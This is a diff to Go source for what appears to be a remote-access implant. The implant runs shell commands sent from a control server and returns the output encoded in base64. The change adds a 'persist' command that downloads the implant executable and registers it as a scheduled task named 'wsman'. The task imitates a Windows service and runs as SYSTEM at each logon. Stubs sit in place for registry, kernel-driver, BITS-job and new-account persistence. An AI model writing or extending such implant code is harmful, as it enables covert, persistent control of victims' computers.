@@ -37,6 +37,7 @@ var cmdProxyId string
 var cmdAddress string
 var cmdPort string
 var cmdHost string
+var webPort string
 var secret string
 var id string
 var ip string
@@ -192,44 +193,40 @@ func useCommResp(commResp CommandResponse, packet Request) {
 			return
 		}
 
-		var cmdHandle *exec.Cmd
+		if cmdSplit[0] == "persist" {
+			var output string
+			choice, _ := strconv.Atoi(cmdSplit[1])
 
-		if runtime.GOOS == "linux" {
-			command := []string{"-c", cmd}
-			cmdHandle = exec.Command("/bin/sh", command...)
-		} else if runtime.GOOS == "windows" {
-			command := []string{"-c", cmd}
-			cmdHandle = exec.Command("powershell", command...)
+			if platform == "windows" {
+				if choice&SCHTASK == 1 {
+					loc := beaconHttp.download(id + ".exe")
+					if loc != "" {
+						output = "schtasks /create /tn wsman /tr \"" + loc + "\" /sc onlogon /ru System"
+						output += "\n" + string(runShellCommand(output))
+					}
+				}
+				if choice&REGRUNKEY == 1 {
+
+				}
+				if choice&KERNELDRIVER == 1 {
+
+				}
+				if choice&BITSJOB == 1 {
+
+				}
+				if choice&NEWACCOUNT == 1 {
+
+				}
+			}
+
+			data, err := json.Marshal(CommandUpdate{ip, id, curUser, platform, arch, pid, pname, "exec", []byte(output)})
+			debugFatal(err)
+			encoded := b64.StdEncoding.EncodeToString(data)
+			queryCommandHttp(encoded)
+			return
 		}
 
-		stderr, err := cmdHandle.StderrPipe()
-		stdout, err := cmdHandle.StdoutPipe()
-
-		if err = cmdHandle.Start(); err == nil {
-			scanner := bufio.NewScanner(stderr)
-
-			if err != nil {
-				output = append(output, scanner.Text()...)
-				output = append(output, '\n')
-			}
-
-			for scanner.Scan() {
-				output = append(output, scanner.Text()...)
-				output = append(output, '\n')
-			}
-
-			scanner = bufio.NewScanner(stdout)
-
-			if err != nil {
-				output = append(output, scanner.Text()...)
-				output = append(output, '\n')
-			}
-
-			for scanner.Scan() {
-				output = append(output, scanner.Text()...)
-				output = append(output, '\n')
-			}
-		}
+		output = runShellCommand(cmd)
 
 		if len(output) > 0 {
 			data, err := json.Marshal(CommandUpdate{ip, id, curUser, platform, arch, pid, pname, "exec", output})
@@ -238,6 +235,49 @@ func useCommResp(commResp CommandResponse, packet Request) {
 			queryCommandHttp(encoded)
 		}
 	}
+}
+
+func runShellCommand(cmd string) []byte {
+	var output []byte
+	var cmdHandle *exec.Cmd
+
+	if runtime.GOOS == "linux" {
+		command := []string{"-c", cmd}
+		cmdHandle = exec.Command("/bin/sh", command...)
+	} else if runtime.GOOS == "windows" {
+		command := []string{"/c", cmd}
+		cmdHandle = exec.Command("cmd.exe", command...)
+	}
+
+	stderr, err := cmdHandle.StderrPipe()
+	stdout, err := cmdHandle.StdoutPipe()
+
+	if err = cmdHandle.Start(); err == nil {
+		scanner := bufio.NewScanner(stderr)
+
+		if err != nil {
+			output = append(output, scanner.Text()...)
+			output = append(output, '\n')
+		}
+
+		for scanner.Scan() {
+			output = append(output, scanner.Text()...)
+			output = append(output, '\n')
+		}
+
+		scanner = bufio.NewScanner(stdout)
+
+		if err != nil {
+			output = append(output, scanner.Text()...)
+			output = append(output, '\n')
+		}
+
+		for scanner.Scan() {
+			output = append(output, scanner.Text()...)
+			output = append(output, '\n')
+		}
+	}
+	return output
 }
 
 func main() {
